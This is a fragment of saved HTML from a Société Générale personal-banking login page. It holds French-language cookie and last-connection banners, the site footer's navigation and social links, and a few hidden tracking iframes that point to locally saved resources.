<aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
    <div class="dcw_msg-banner_msg-wrapper">
        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#info"></use></svg>
        <p class="dcw_msg-banner_message">
            En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="#charte-cookies-societe-generale" class="eip_dcw_main-link">cliquez ici</a></span>.
        </p>
        <button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#close-2"></use></svg>
        </button>
    </div>
</aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">&nbsp;</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
</aside>

<footer class="dcw_footer" role="contentinfo">
	<div class="dcw_footer-second">
		<div class="dcw_footer_container">
			<nav class="dcw_footer-second_nav">
				<ul class="dcw_footer-second_list">
					    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#localisation"></use></svg>
            Trouver une agence
</a>    </li>
    <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="#faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#question"></use></svg>
            Questions fréquentes
</a>    </li>
<li class="dcw_footer-second_item">
							<div class="dcw_dropdown js-dropdown">
    <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#arrow-dropdown"></use></svg>
    <ul class="dcw_dropdown_list toggle_content">
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://professionnels.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="professionnels">Professionnels</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://entreprises.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="entreprises">Entreprises</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://associations.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="associations">Associations</a>
            </li>
            <li class="dcw_dropdown_item">
                <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.societegenerale.com/fr/accueil" data-tms-click-type="N" data-tms-element-label="groupe-société-générale">Groupe Société Générale</a>
            </li>
    </ul>
</div></li>
					</ul>
			</nav>
			<ul class="dcw_footer_container dcw_footer-second_social">
				    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#facebook-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#twitter-2"></use></svg>
</a>    </li>
    <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l&#39; Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#static/Resources/img/pictos-fonctionnels_20190321171150.svg#instagram"></use></svg>
</a>    </li>
</ul>
		</div>
	</div>
	<nav class="dcw_footer-third">
		<div class="dcw_footer_container">
			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="./Connexion_files/logo-sg-seul.svg" width="150">
<ul class="dcw_footer-third_list">
				    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#tous-nos-tarifs" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#engagements" data-tms-click-type="N" data-tms-element-label="nos-engagements">Nos engagements</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#informations-mentions-legales" data-tms-click-type="N" data-tms-element-label="informations-légales">Informations légales</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#charte-cookies-societe-generale" data-tms-click-type="N" data-tms-element-label="charte-cookies">Charte Cookies</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#securite" data-tms-click-type="N" data-tms-element-label="sécurité">Sécurité</a>
    </li>
    <li class="dcw_footer-third_item">
        <a data-tms-container-label="footer-super-links" href="#engagements/gestion-donnees-personnelles-rgpd" data-tms-click-type="N" data-tms-element-label="données-personnelles">Données personnelles</a>
    </li>
</ul>
		</div>
	</nav>
	</footer>
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/regions/75eec1c77d92f510VgnVCM100000030013acRCRD -->
<!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 75eec1c77d92f510VgnVCM100000030013acRCRD, regionNames: gb9-com2-int,gb9-com4-int,footer-int-without-closing-main, FURL_NAME: /authen/footer, FURL_ID: 1983c1c77d92f510VgnVCM100000030013acRCRD -->
            

			
			
    


<div id="interactWrapper" class="sdcwrapper"></div><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.7908660559046643"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.19902738514426677" width="0" height="0" alt="" src="./Connexion_files/0"></div><script type="text/javascript" src="./Connexion_files/Serving" async=""></script><iframe height="0" width="0" id="dmp_bridge_iframe" sandbox="allow-scripts allow-same-origin" src="./Connexion_files/dmp_bridge.html" style="height: 0px; width: 0px; border: 0px;"></iframe><div id="lottie" class="inbenta-loader" iaf-loader="" style="display: none;"></div><iframe id="iframe789" frameborder="0" src="./Connexion_files/saved_resource(1).html" title="wxbnb_" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe130" frameborder="0" src="./Connexion_files/saved_resource(2).html" title="fmsunm" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe500" frameborder="0" src="./Connexion_files/saved_resource(3).html" title="sp_pnp" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe980" frameborder="0" src="./Connexion_files/saved_resource(4).html" title="suhgvx" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe580" frameborder="0" src="./Connexion_files/saved_resource(5).html" title="lnezmg" style="width: 0px; height: 0px; border: none; display: none;"></iframe></body></html>